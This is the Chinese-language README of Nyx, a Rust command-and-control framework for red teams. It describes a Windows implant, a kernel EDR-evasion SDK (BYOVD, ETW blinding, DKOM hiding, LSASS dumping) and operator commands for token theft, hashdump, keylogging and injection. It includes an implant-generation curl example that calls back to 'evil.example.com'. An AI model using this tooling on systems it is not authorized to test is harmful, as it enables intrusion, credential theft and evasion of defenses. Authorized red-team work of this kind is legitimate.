# Nyx C2 Framework

> **授权红队 / 渗透测试专用。禁止在未获授权的系统上部署或运行。**

纯 Rust 全栈 C2 框架,融合 Cobalt Strike 的可扩展性与 Brute Ratel 的默认隐蔽性。**所有能力状态以代码核对为准**(本次 README 于 2026-07-18 经 6 路并行代码审计重写,每条声称附 `file:line` 证据)。

> 📋 **完整审计报告**:[`docs/audits/CODE_TRUTH_2026-07-18.md`](docs/audits/CODE_TRUTH_2026-07-18.md)(逐 crate 证据) · [`AUTHORITATIVE_FACTS_2026-07-18.md`](docs/audits/AUTHORITATIVE_FACTS_2026-07-18.md)(数字基准,所有文档统一来源)

**实测规模**:~68,800 行 Rust · 18 workspace 成员 + 6 独立 crate · 488 `#[test]` · 46 个 selftest 导出 · 28 wire `Command` / 7 `Response` 变体。

---

## 功能概览

| 层 | 能力 | 代码实情(2026-07-18 审计) |
|---|---|---|
| **加密协议** | X25519 ECDH + HKDF-SHA256 + ChaCha20-Poly1305;方向隔离 nonce;单调计数器防重放;secrets 零化 | ✅ 完整无弱点(`protocol/src/crypto.rs:383-408`,40 测试) |
| **团队服务器** | tokio/axum HTTP(S);三机制鉴权(bootstrap operator / operators file / legacy token);三角色 RBAC(argon2id);会话/任务队列;SQLite 凭据+implant 库;哈希链审计;Rhai 事件脚本;Malleable C2 profile;implant 生成 | ✅ 完整(`server/src/lib.rs`,14 静态 + 动态 profile 路由) |
| **Windows PIC 植入体** | 29,202 LOC `no_std` DLL;**28** Command 全派发;间接 syscall;9 通道(5 直连 + 4 ExtC2 中转);Module Stomping + ThreadlessInject + Pool Party;HWBP patchless blind;CFG 用户态 bitmap;LACUNA/insomniac/caller-spoof/proxy-veh scanner | ✅ 核心链路完整;**睡眠混淆未接线**(见已知限制) |
| **内核层 SDK** | BYOVD(Shield/RTCore64/Iqvw64e 可用,WDTKernel 物理内存 stub);ETW-TI blind(4-hop);DKOM 进程隐藏;回调中和+重定向;MiniFilter 解链;PPL stripper;CFG bitmap;LSASS 内核读;minidump 组装;ETW 事件伪造 | ✅ 算法完整 + mock 测试;PatchGuard 偏移未验证 |
| **操作端** | Tauri 2 + React + Three.js 桌面 GUI(3D 网络拓扑 + 语义化命令 + 结构化输出);REST API;2s 轮询增量更新 | ✅ 可用(2026-07-17 接入全部 server 端点);无会话元数据 overlay |
| **脚本 / 扩展** | Rhai 脚本(3 event,资源配额);Malleable C2 profile(c2lint);BOF(CS ABI,W^X loader,仅 `BeaconPrintf`) | ✅ 脚本可用 / 🟡 BOF 兼容面窄 |
| **传输层** | 6 个 `Transport` trait impl(Malleable/DoH/Slack/LLM/MCP/SMB)+ JA3/JA4 计算 | 🟡 **零消费者**:仅 JA3/JA4 接入 server,6 个 channel 无 beacon 调用 |

---

## 项目结构

```
crates/
├── protocol/              # 加密协议 (X25519+HKDF+ChaCha20-Poly1305, 1,895 LOC, 无 stub)
├── server/                # 团队服务器 (tokio/axum, 5,615 LOC)
├── store/                 # SQLite 凭据/implant/session 库 (1,321 LOC)
├── transport/             # TLS JA3/JA4 + 通道定义 (3,420 LOC, 🟡 零消费者)
├── rest/                  # REST 类型库 (189 LOC, client 共享)
├── parse/                 # shell 输出解析器 (544 LOC)
├── profile/               # Malleable C2 profile 解析 + c2lint (1,733 LOC)
│
├── implant-win/           # Windows PIC 植入体 (no_std, 29,202 LOC, 独立 crate)
│   ├── syscalls.rs        #   间接 syscall runtime (SSN 表 + RX trampoline)
│   ├── unhook.rs          #   KnownDlls fresh ntdll 映射(反 hook 解析)
│   ├── blind_hwbp.rs      #   HWBP patchless blind (VEH 影子桩) ← 默认路径
│   ├── blind.rs           #   AMSI/ETW 字节 patch fallback
│   ├── cfg_user.rs        #   用户态 CFG bitmap 写入
│   ├── lacuna.rs          #   .pdata 间隙扫描
│   ├── stack.rs           #   BYOUD-Gap 栈欺骗 (mov rsp 内联汇编)
│   ├── fluctuation.rs     #   睡眠混淆实现 (🟡 未接线,见已知限制)
│   ├── sleep.rs           #   Foliage APC 脚手架 (🔴 死代码)
│   ├── inject.rs          #   Module Stomping (默认 arm) + ThreadlessInject
│   ├── tp.rs              #   Pool Party (默认 OFF)
│   ├── channels/          #   9 通道: Https/DohDns/Dns/Smb/Tcp + 4 ExtC2 中转
│   └── selftests.rs       #   46 个 selftest 导出 (feature-gated)
├── operator-kernelsdk/    # 内核 EDR 绕过 SDK (9,791 LOC, 独立 crate)
│   ├── byovd.rs + byovd_drivers/  # BYOVD: Shield / RTCore64 / Iqvw64e / WdtKernel(stub)
│   ├── etwti.rs           #   ETW-TI blind (4-hop)
│   ├── telemetry.rs       #   回调中和 + MiniFilter 解链
│   ├── persistence.rs     #   DKOM 隐藏 + PPL strip + PatchGuard 窗口
│   ├── netsec.rs          #   LSASS 内核读 + CFG bitmap + WfpKit(🟡 永返 Err)
│   ├── etw_deception.rs   #   ETW 事件伪造 (🟡 仅 CLI 调用,无 tier 装配)
│   └── win/ksld.rs        #   LivingOffDefender (优先于 BYOVD)
│
├── operator-kernel-cli/   # 内核 CLI (912 LOC, 5 binary, 含 daemon 模式)
├── offset-resolver/       # ntoskrnl/fltmgr PDB 下载 + 偏移解析 (657 LOC)
├── minidump-assembler/    # LSASS 裸内存 → mimikatz .dmp (469 LOC)
│
├── client-ui-web/         # 操作端 GUI (Tauri 2 + React + Three.js)
│   ├── src-tauri/src/     #   Rust 后端 (~613 LOC, 12 #[tauri::command])
│   └── src/               #   前端 (~4,500 LOC ts/tsx, 含 1001 LOC 拓扑场景)
├── agent-dev/             # macOS/Linux 开发验证植入体 (1,181 LOC, 完整协议循环)
├── bof-runner/            # BOF 加载器 (421 LOC, 仅 BeaconPrintf shim)
├── coff/                  # COFF/AMD64 解析 + 重定位 (365 LOC)
├── evasion/               # syscall 解析 (Hell/Halo/Tartarus Gate, 264 LOC)
├── implant-evasionsdk/    # 植入体逃避算法库 (2,028 LOC, 9 trait 全 floor)
├── scripting/             # 脚本事件总线 (237 LOC)
├── scripting-rhai/        # Rhai 引擎绑定 (166 LOC, 资源配额)
├── config/ + config-macros/  # 编译期加密配置 (ChaCha20-Poly1305, 345 LOC)
├── nyx-loader/            # PIC payload 加密 (1,225 LOC;🔴 反射加载仅参考实现)
└── nyx-mutate/            # 二进制变异 (804 LOC, 4 趟含指令替换)
```

> **注**:`implant-win` / `operator-kernelsdk` / `operator-kernel-cli` / `minidump-assembler` / `offset-resolver` / `implant-evasionsdk` 共 6 个 crate 是**独立 crate**(不在 workspace,因 no_std/nightly/Windows target 隔离),单独构建。

### 工作量统计(实测)

| 维度 | 数值 | 来源 |
|---|---|---|
| workspace Rust 源码 | 68,751 行 | `find crates -name '*.rs' \| xargs wc -l` |
| workspace 成员 | 18(+6 独立) | `Cargo.toml [workspace] members` |
| `#[test]` / `#[tokio::test]` | 488 | 含独立 crate;`cargo test --workspace` 跑 267(workspace 内) |
| selftest 导出 | 46 | `implant-win/src/selftests.rs`(`#[cfg(feature="selftest")]`) |
| wire `Command` 变体 | **28** | `protocol/src/msg.rs:130` |
| wire `Response` 变体 | 7 | `protocol/src/msg.rs:560` |
| GUI 命令(已解析) | 29 | `client-ui-web/src/components/CommandInput.tsx` |
| server 路由 | 14 静态 + 7 beacon + 6 kernel(条件) + 动态 profile | `server/src/lib.rs:716-779` |
| BYOVD 驱动 | 3 可用 + 1 stub | `operator-kernelsdk/src/byovd_drivers/` |
| Windows build 覆盖 | 8 主 + 6 patch-equiv = 14 distinct | `implant-evasionsdk/src/offsets_table.rs` |

---

## 环境要求

| 工具 | 版本 | 用途 |
|---|---|---|
| Rust stable | ≥ 1.80 | 服务端 / 客户端 / 支撑 crate(workspace 默认) |
| Rust nightly | — | 植入体(`implant-win`,`no_std`) |
| `x86_64-pc-windows-gnu` target | — | 植入体交叉编译 |
| `mingw-w64` | 16.1.0 推荐 | Windows 交叉链接器 |
| Node.js | ≥ 18 | GUI 前端构建 |
| Windows Server 2019+ | — | 植入体真机运行 |

```bash
rustup target add x86_64-pc-windows-gnu
rustup toolchain install nightly
rustup component add rust-src --toolchain nightly
```

---

## 快速上手

### 1. 启动团队服务器

```bash
# 开发模式 (loopback HTTP, 无鉴权, 临时密钥对)
cargo run --release -p nyx-server

# 生产模式 (持久密钥 + Bearer + TLS)
NYX_BIND=0.0.0.0:8443 \
NYX_KEYFILE=~/.nyx/server.key \
NYX_BOOTSTRAP_OPERATOR=admin:your_secret \
NYX_TLS=on \
cargo run --release -p nyx-server
```

> `NYX_BIND` 默认 `127.0.0.1:8443`(loopback)。非 loopback 绑定且无鉴权时,服务器自动生成一次性 token 并打印;设 `NYX_ALLOW_OPEN=1` 才允许开放模式。

服务器启动后输出 X25519 公钥(hex),烤入植入体构建。

### 2. 构建 dev 植入体(macOS/Linux 协议验证)

```bash
export NYX_SERVER=http://127.0.0.1:8443
export NYX_SERVER_PUB=<服务器输出的公钥 hex>
cargo run --release -p nyx-agent-dev
```

`agent-dev` 跑完整加密协议循环(check-in / task / execute / return),Windows-only 原语(StealToken/Inject/Trex/Keylog 等)返回 `Response::Err`。

### 3. 构建 Windows PIC 植入体

> ⚠️ **implant-win 是独立 crate,不在 workspace 里。** 必须在它的目录内构建,不能用 `-p nyx-implant-win`。

```bash
# 检查编译(从仓库根目录)
(cd crates/implant-win && cargo +nightly check --target x86_64-pc-windows-gnu)

# Release 构建
(cd crates/implant-win && cargo +nightly build --release \
  --target x86_64-pc-windows-gnu -Z build-std=core,alloc)
```

输出 `target/x86_64-pc-windows-gnu/release/nyx_implant_win.dll`。

> **编译期 gate**(均为 `option_env!`,默认值见下表):
> - `NYX_FLUCTUATION_OFF=1` — 关闭 Fluctuation 睡眠混淆(退到纯 sleep)。**注:当前 beacon 循环本就不经 Fluctuation**(`kits.rs:65-71` 短路到 `beacon::sleep_seconds`),此 gate 暂无运行时效果。
> - `NYX_SPOOF_OFF=1` — 关闭栈欺骗(CET-off 主机默认自动 arm,`entry.rs:137-153`)
> - `NYX_TLS_INSECURE=1` — 放宽 WinHTTP 证书校验(默认 OFF)。`WinHttpSetOption` 在 `WinHttpSendRequest` **之前**调用(`transport.rs:332-353`)。
> - `NYX_POOL_PARTY_ON=1` — 开启 Pool Party 注入(默认 OFF)
> - `NYX_SKIP_SANDBOX=1` — 跳过沙箱检测(SYSTEM 部署时;**注意此项是运行时 env,非编译期**)

### 4. 启动操作端 GUI (Tauri 2 + React)

```bash
cd crates/client-ui-web
npm install          # 首次:装前端依赖
npm run tauri dev    # 启动(自动连 http://127.0.0.1:8443,在连接页输入 bearer)
```

> GUI 含 3D 网络拓扑(Three.js,UnrealBloom 后处理 + 射线点击选中)、语义化命令输入、结构化任务输出、2s 增量轮询。纯前端开发(不启 Tauri 外壳):`npm run dev`。

### 5. 服务器侧生成 implant

```bash
# REST API
curl -X POST http://127.0.0.1:8443/api/generate-implant \
  -H "Authorization: Bearer admin:your_secret" \
  -H "Content-Type: application/json" \
  -d '{"callback":"evil.example.com","port":443,"format":"dll"}'
```

服务器 patch DLL 模板(每 implant 独立 X25519 keypair + config 加密 + mutation + 一次性 auth_token),`NYX_TEMPLATE` 指向模板路径。速率限制 10/hr/target(`implant_gen.rs`)。

---

## 服务器环境变量

| 变量 | 默认 | 说明 |
|---|---|---|
| `NYX_BIND` | `127.0.0.1:8443` | 监听地址 |
| `NYX_KEYFILE` | —(每次随机) | 持久 X25519 私钥(0600)。session 元数据经 SQLite 持久化层落盘(`NYX_CREDS` 库,boot 恢复,`server/src/lib.rs:250-336`) |
| `NYX_TOKEN` | — | legacy 共享 Bearer(Admin);优先级低于 operators file |
| `NYX_BOOTSTRAP_OPERATOR` | — | `name:secret` 首个 Admin(argon2id 哈希,`operators.rs:127-158`) |
| `NYX_OPERATORS_FILE` | `~/.nyx/operators.json` | 操作员注册表 |
| `NYX_KILLDATE` | —(永不过期) | Unix 时间戳,过期拒绝所有 beacon(`main.rs:47-59`) |
| `NYX_TLS` | off | 任意值启用 rustls HTTPS |
| `NYX_CERT` / `NYX_KEY` | — | PEM 证书/密钥(需同时设) |
| `NYX_PROFILE` | — | Malleable C2 profile(c2lint 在加载时验证) |
| `NYX_SCRIPT` | — | Rhai 事件脚本(`on_session_new` / `on_result` / `on_session_exit`) |
| `NYX_CREDS` | `~/.nyx/server-creds.db` | 凭据+implant+session SQLite 路径 |
| `NYX_AUDIT_LOG` | `~/.nyx/audit.jsonl` | 审计日志(哈希链,`audit.rs:106-261`) |
| `NYX_TEMPLATE` | — | implant DLL 模板路径(启用生成) |
| `NYX_KERNEL_DAEMON` | — | `host:port` 内核 daemon;设后注册 `/api/kernel/*` 路由 |
| `NYX_ALLOW_OPEN` | — | `=1` 允许非 loopback 开放模式 |
| `NYX_SESSION_MAX_AGE` | `604800`(7d) | session 年龄 GC |
| `NYX_SESSION_MAX_IDLE` | `86400`(24h) | session 空闲 GC |

---

## GUI 命令速查

操作端为 Tauri 桌面 GUI(旧 ratatui TUI / Makepad GUI 已于 commit `c5064dc` 归档)。命令输入框解析 **29 个命令**(`CommandInput.tsx:214-454`),全部映射到 `POST /api/task`。session 元数据(rename/tag/star/alias)**尚未接入 GUI**。

### 会话 / 侦察

```
ping                    存活探测
sleep <s> [jitter]      调整睡眠
screenshot              屏幕截图(BMP,跨会话)
screenwatch             持续截屏(3 帧)
driveinfo               驱动器信息
env [NAME]              环境变量
clipboard               剪贴板
net                     ifconfig/netstat/arp
portscan <host> <ports> TCP 端口扫描
```

### 文件操作

```
ls [path]               目录列表
cd / mkdir / rm         文件系统操作
mv / cp                 移动 / 复制
upload <local> <remote>   上传
download <remote>       下载(64KB 分块)
```

### 执行 / 权限

```
shell <cmd>             cmd.exe /c 或 sh -c
bof <hex> [args...]     BOF 执行(仅 BeaconPrintf 兼容)
exit                    退出 implant
getuid                  当前用户
stealtoken <pid>        窃取 token(Windows)
maketoken <u> <d> <p>   制作 token
rev2self                还原 token
```

### 凭据 / 控制 / 隧道

```
hashdump [method]       SAM/SYSTEM hash 提取(method=3 macOS shadow-hash)
keylog <start|dump>     键盘记录(Windows)
inject <pid> <hex> [m]  进程注入(m: 0=PoolParty/OFF→stomp, 1=ThreadlessHWBP, 2=stomp)
connect <host> <port>   TCP 反向端口转发
socks <port>            SOCKS5 relay
setchannel <ch>         切换 C2 通道
channelclose <id>       关闭通道
trex                    T-REX EDR 评估分级
```

---

## 内核层操作

内核能力通过独立 CLI 操作(需 Windows + 管理员),或通过 team server 的 `/api/kernel/*` 中转(需先启 daemon):

```bash
# 内核 CLI(独立 crate)
(cd crates/operator-kernel-cli && cargo run --release --)

# 子命令: bootstrap / blind-etw / hide <pid> / dump-lsass <pid> \
#         neutralize <pid> <freeze|choke|kill> / detach-minifilter \
#         pg-window / cfg-bypass / forge-etw / --serve <port>(daemon 模式)
```

`--serve <port>` 启动 TCP JSON-line daemon,team server 设 `NYX_KERNEL_DAEMON=127.0.0.1:<port>` 后会注册 `/api/kernel/{status,blind-etw,hide,dump-lsass,neutralize,detach-minifilter}` 6 个路由。

### 偏移自动解析

```bash
# 从 MS Symbol Server 下载 ntoskrnl.pdb 解析偏移
(cd crates/offset-resolver && cargo run --release -- \
    --ntoskrnl C:\Windows\System32\ntoskrnl.exe --out offsets.toml)

# 或从 fltmgr.pdb 解析 FltGlobals RVA
(cd crates/offset-resolver && cargo run --release -- \
    --fltmgr C:\Windows\System32\drivers\fltmgr.sys --out flt.toml)
```

无 PDB 时回退到内置偏移表(`implant-evasionsdk/src/offsets_table.rs`,覆盖 8 主 build + 6 patch-equivalent)。

---

## 线网协议

```
[4B frame magic "NYX1"][1B dir][8BE u64 counter][4BE u32 ct_len][12B nonce][N ct][16B Poly1305 tag]
```

- **方向隔离 nonce**:dir 字节(0=client→server, 1=server→client)分离两套计数器空间(`crypto.rs:383-408`)
- **防重放**:单调计数器 + 写守卫 TOCTOU 关闭(`server/src/lib.rs`)
- **分配炸弹防护**:`decode_vec` 拒绝 declared count > 65536,且不超过剩余字节(`msg.rs:35-41`)
- **blob 长度上限**:`MAX_BLOB_LEN` = 256 KiB;frame `MAX_CT_LEN` = 512 KiB

完整 28 Command + 7 Response 的 wire 编解码见 `protocol/src/msg.rs`,round-trip 测试在 `protocol/tests/roundtrip.rs`。

---

## 构建与测试

```bash
# 工作区构建(服务端 + 客户端 + 支撑 crate)
cargo build --workspace

# 工作区测试(约 267 个)
cargo test --workspace

# 植入体检查(nightly + Windows target,需 cd 进独立 crate)
(cd crates/implant-win && cargo +nightly check --target x86_64-pc-windows-gnu)

# 内核 SDK 测试(独立 crate,全 mock,可 macOS 跑)
(cd crates/operator-kernelsdk && cargo test)

# 独立 crate 测试
for c in implant-evasionsdk evasion coff config config-macros minidump-assembler nyx-loader nyx-mutate bof-runner; do
  (cd crates/$c && cargo test)
done

# Malleable C2 profile 验证
cargo run -p nyx-profile --bin c2lint -- <profile>

# lint
cargo clippy --workspace --all-targets
```

---

## 已知限制(代码核对实情,2026-07-18)

| 项 | 代码实情 | 证据(file:line) |
|---|---|---|
| **睡眠混淆 Fluctuation** | 🔴 **未接线** | `fluctuation.rs` 实现完整,但 `kits.rs:65-71` 的 `sleep()` 短路到 `beacon::sleep_seconds`(纯 `NtWaitForSingleObject`)。注释承认"Foliage fluctuation crashes in noevasion mode"。`mem::mask()` 注册了 config/key/heap 区域但永不调用。**中睡眠时 .text/config/key 为明文。** |
| **Foliage APC .text 加密** | 🔴 死代码 | `sleep.rs` 仅脚手架(`FoliageRaw` 等),`sleep::sleep()` 零调用方。文档提到的 `execute_foliage_plan`/`FOLIAGE_ENABLED` 仅作为 doc 注释提及,无可调用定义。 |
| **transport/ crate** | 🟡 零消费者 | 6 个 `Transport` impl(Malleable/DoH/Slack/LLM/MCP/SMB)+ trait 本身在 crate 外**零引用**。server 用裸 `tokio-rustls`,implant 用自滚 WinHTTP。仅 JA3/JA4 计算接入 server。 |
| **TLS 指纹 emitter** | 🔴 死代码 | `build_impersonating_client` 永返 `Err(BackendUnavailable)`(`fingerprint.rs:144-148`),`rquest` 依赖未在 Cargo.toml。出站 JA3 不可控。 |
| **caller-spoof** | 🟡 仅 scanner | `caller_spoof.rs` 只扫 `ADD RSP,imm8;RET` stub,文档所述 `call_with_spoofed_return!` 宏不存在。 |
| **proxy_veh 注册路径** | 🟡 未用 | `register_section_backed_handler` 完整实现(KnownDlls SEC_IMAGE + code cave trampoline),但 HWBP 路径直接用 `AddVectoredExceptionHandler`。gadgets 扫描后未消费。 |
| **Pool Party 注入** | 🟡 完整但默认 OFF | `tp.rs` 全实现(section 投递 + worker-factory 劫持 + `_TP_DIRECT` splice),仅 `NYX_POOL_PARTY_ON=1 && method=0 && pid!=0` 时触发。 |
| **BOF 兼容面** | 🟡 窄 | Beacon-API 表只有 `BeaconPrintf`(`bof-runner/src/win.rs:179`)。多数社区 BOF 在重定位时 `Unresolved` 失败。每次执行泄漏 RWX 页,crate 零测试。 |
| **WfpKit(内核)** | 🔴 装配但永失败 | `netsec.rs:block_outbound_for_pid` 永返 Err(拒绝零条件 filter);`assemble_tier` 设 `wfp: None`。**注:implant-win 中无任何 WFP 代码**(grep 零命中)。 |
| **PatchGuard bypass** | 🟡 偏移未验证 | `persistence.rs:550-720` 用 valid_flag 置零法,偏移 `prcb_pg_thread=0x190`/`valid=0x08` 代码自标需 PDB 验证。非 Outflank Peekaboo 法。 |
| **EdrNeutralizer::kill** | 🟡 仅 resolve | 只解析 EPROCESS KVA,不终止目标进程。 |
| **WdtKernel 驱动** | 🟡 stub | 物理内存 r/w(0x9C412420/0x9C41242C)真,但 VA `raw_rw` 永返 `Err(0)`。 |
| **etw_deception 事件伪造** | 🟡 死路径 | 完整实现,但无 tier 装配;仅 `operator-kernel-cli forge-etw` 子命令调用。 |
| **nyx-loader 反射加载** | 🔴 参考实现 | 加密+组装真;PIC stub 自定位后 `ret`(`stub.rs:71-89`),27B trampoline 空间未 patch。PEB walk/import resolve/DllMain 是 std 参考实现,非 on-target。 |
| **implant-evasionsdk trait** | 🟡 全 floor | 9 trait 仅 `Floors` no-op impl(`lib.rs:366-413`)。算法子模块(gap/frame/rc4/foliage/apc/swap/offsets_table)真且测试,但非 test build 下 `#[allow(dead_code)]`。 |
| **`mask_secret()`** | 🔴 stub | 永返 `"********"`,文档承诺的 `first2….last2` 未实现(`store/src/model.rs:72-74`)。 |
| **SQLite migration** | 🟡 仅基线 | `migrate()` 框架真,但 v0→v1 是 no-op;所有表用 `CREATE TABLE IF NOT EXISTS`。 |
| **`created_by` 归因** | 🔴 未接 | implant 记录的 operator 归因永为 `None`(`implant_gen.rs:620` TODO)。 |
| **fallback 链** | 🟡 短 | 只有 `Https → DohDns → Dns`(`channels/mod.rs:259`)。 |
| **GUI 渲染盲点** | 🟡 部分 | `image`/`channel`/`file` 结果是占位符;`ProcessTable.tsx` 死文件;`fetch_profile` 定义但前端未调。 |
| **Win11 25H2 真机** | 🟡 暂缓 | 需 CET+HVCI 物理机。 |
| **BOF 内存泄漏** | 🟡 | `bof-runner` 每次执行不释放 RWX/trampoline 页(`win.rs`)。 |
| **sessions 持久化** | ✅ 完整 | SQLite durability layer,boot 恢复,2026-07-16 实测重启同 id 复原。 |

---

## 真机验证状态

| 目标环境 | 测试项 | 结果 |
|---|---|---|
| Windows Server 2019(17763.1339)+ Defender ON | 完整 beacon 循环(加密 check-in → 任务 → 执行 → 加密回传) | ✅ |
| 同上 | selftest(`scripts/win_selftest_all.ps1`) | ✅ |
| 同上 | 内核 SDK(BYOVD + ETW-TI + DKOM + 回调中和) | ✅ |
| 同上 | /screenshot 跨会话(Session 0 → 2) | ✅ |
| 同上 | /hashdump SAM + SYSTEM hive | ✅ |
| Win11 24H2(build 26100,CI runner) | 编译无回归 | ✅ |
| Win11 25H2 CET+HVCI 物理机 | SPOOF_SWAP CET 修复缝 / HVCI 硬件触发 | 🟡 需物理机 |
| macOS(team server + agent-dev + GUI) | 协议循环 + 操作端 | ✅(本次审计期间实测 server 运行 + 真实 beacon 会话) |

---

## Roadmap

- **接线睡眠混淆** — 让 beacon 循环走 `fluctuation::sleep`(当前 `kits::sleep` 短路)。**最高优先级**,直接决定睡眠期内存扫描对抗能力。
- **nyx-loader 反射加载** — PEB walk / import resolve / DllMain on-target 实现(当前 PIC stub 以 `ret` 结尾)。
- **BOF API 扩面** — 接入 `BeaconDataParse`/`BeaconIsAdmin`/`BeaconGetSpawnTo` 等,提升社区 BOF 兼容性;补页释放。
- **transport/ crate 接线** — 让 beacon 走 `TransportStack` 而非自滚 WinHTTP,激活 6 个零消费者 channel。
- **TLS 指纹 emitter** — 实现 `build_impersonating_client`(需引入 `rquest` 或 BoringSSL)。
- **PatchGuard 偏移验证** — 用 PDB 校验 PRCB/context 偏移,或改用 Outflank Peekaboo 时序法。
- **caller-spoof 完成** — 实现 `call_with_spoofed_return!` 宏(当前仅 scanner)。
- **GUI 会话元数据 overlay** — rename / tag / star / alias(TUI 曾有,GUI 无)。
- **CET 物理机验证** — Win11 25H2 CET+HVCI 真机 + `#CP` 修复缝(`KiControlProtectionFault` + `RtlRestoreContext`)。
- **`mask_secret` 真实现** — `first2….last2` 掩码。
- **SQLite migration 真演化** — 超出 `CREATE TABLE IF NOT EXISTS` 基线。

---

## 免责声明

本项目仅用于授权安全测试和研究目的。**请勿在未明确授权的系统上部署或运行。** 所有内核绕过、注入、凭据提取能力仅限于合法授权的红队 / 渗透测试场景。
